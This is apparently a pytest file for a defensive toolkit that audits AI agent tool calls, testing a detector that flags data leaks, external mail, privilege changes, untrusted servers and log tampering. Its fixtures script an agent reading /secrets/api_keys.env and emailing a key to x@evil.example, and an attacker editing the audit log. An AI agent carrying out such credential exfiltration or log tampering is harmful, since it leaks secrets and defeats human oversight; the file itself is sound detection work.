"""Post-hoc audit-log detector (Gap 3)."""

import json
from pathlib import Path

from mcpguard.defenses.audit import AuditLog
from mcpguard.defenses.detector import detect


def write_log(path: Path, calls, untrusted=()):
    log = AuditLog(path)
    log.log("tools_listed", tools=[], untrusted_servers=list(untrusted), defense={})
    for tool, server, args, decision, result in calls:
        log.log("tool_call", step=1, tool=tool, server=server, arguments=args,
                decision={"decision": decision, "layer": None, "reason": ""}, result=result)
    return path


def test_benign_log_is_clean(tmp_path):
    p = write_log(tmp_path / "a.jsonl", [
        ("read_file", "files", {"path": "/home/alice/invoice_4411.txt"}, "allowed", "Invoice"),
        ("transfer_funds", "bank", {"to_account": "ACC-VENDOR-77", "amount": 120}, "allowed", "Transferred"),
        ("send_email", "mail", {"to": "bob@corp.example", "subject": "s", "body": "b"}, "allowed", "Email sent"),
    ])
    assert detect(p) == []


def test_attack_patterns_fire(tmp_path):
    p = write_log(tmp_path / "a.jsonl", [
        ("read_file", "files", {"path": "/secrets/api_keys.env"}, "allowed", "AWS..."),
        ("send_email", "mail", {"to": "x@evil.example", "subject": "s", "body": "AKIA-ZZZZ-12345678"},
         "allowed", "Email sent"),
        ("transfer_funds", "bank", {"to_account": "ACC-OTHER-1", "amount": 5}, "denied", "ERROR: declined"),
        ("grant_access", "files", {"path": "/secrets", "principal": "alice"}, "allowed", "ERROR: denied"),
        ("read_file", "toolkit", {"path": "/home/alice/a"}, "allowed", "x"),
    ], untrusted=["toolkit"])
    assert detect(p) == ["DLP", "EXT_MAIL", "OUT_OF_HOME_READ", "POLICY_BLOCK", "PRIV_CHANGE", "UNTRUSTED_TOOL"]


def test_failed_actions_do_not_count_as_executed(tmp_path):
    p = write_log(tmp_path / "a.jsonl", [
        ("read_file", "files", {"path": "/hr/salaries.csv"}, "allowed", "ERROR: permission denied"),
    ])
    assert detect(p) == []


def test_tampering_is_detected(tmp_path):
    p = write_log(tmp_path / "a.jsonl", [
        ("send_email", "mail", {"to": "x@evil.example", "subject": "s", "body": "b"}, "allowed", "sent"),
    ])
    lines = p.read_text().splitlines()
    p.write_text("\n".join(lines[:1]) + "\n")  # attacker deletes the incriminating entry
    assert detect(p) == []  # truncation at the end keeps a valid prefix ...
    entry = json.loads(lines[1])
    entry["arguments"]["to"] = "bob@corp.example"  # ... but editing an entry breaks the chain
    p.write_text(lines[0] + "\n" + json.dumps(entry) + "\n")
    assert "TAMPER" in detect(p)
